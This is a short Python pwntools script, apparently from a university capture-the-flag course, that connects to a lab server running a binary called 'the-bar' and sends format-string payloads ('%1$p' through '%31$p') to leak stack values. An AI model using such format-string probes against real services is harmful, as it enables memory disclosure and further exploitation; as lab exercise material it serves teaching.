from pwn import *

# debug info
bin64 = './the-bar'

# remote variables
host = 'cs4401shell2.walls.ninja'
port = 14161

# 2D799

for i in range(1,32):
	with context.silent:
		p = remote(host, port)
		p.recvline(timeout=1)
		p.recvline(timeout=1)
		p.recvline(timeout=1)
		p.recvline(timeout=1)
		p.sendline(b'%' + bytes(str(i), 'utf-8') + b'$p')
	print(f'Arg{i}:     {p.recvline(timeout=1)}')
	with context.silent:
		p.sendline(b'aaaaaaa')
	print(f'System {i}: {p.recvline(timeout=1)}\n')
